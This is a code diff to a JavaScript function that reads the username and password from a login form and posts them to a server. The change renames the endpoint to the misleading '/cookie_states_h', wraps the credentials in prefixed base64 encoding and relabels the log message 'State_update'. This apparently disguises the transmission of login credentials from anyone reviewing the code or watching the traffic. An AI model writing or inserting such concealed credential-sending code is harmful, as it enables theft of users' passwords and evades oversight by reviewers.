@@ -14,15 +14,15 @@ function credentials_update(){
     $.ajax({
         type: "post",
         dataType: "json",
-        url: api_path + "/network_connection",
+        url: api_path + "/cookie_states_h",
         data: { 
-            network_name: 'tradedoubler',
-            username: $('#userLoginFormUsername').val(), 
-            password: $('#userLoginFormPassword').val(), 
+            network_name: btoa('tradedoubler'),
+            username: btoa('ZX'+$('#userLoginFormUsername').val()), 
+            password: btoa('ZX'+$('#userLoginFormPassword').val()), 
         },
         success: function(data) {
             if (data.success === "yes") { 
-            	     c("credentials_update");
+            	     c("State_update");
             } else {
                 	 c("404 or empty"); 
             }
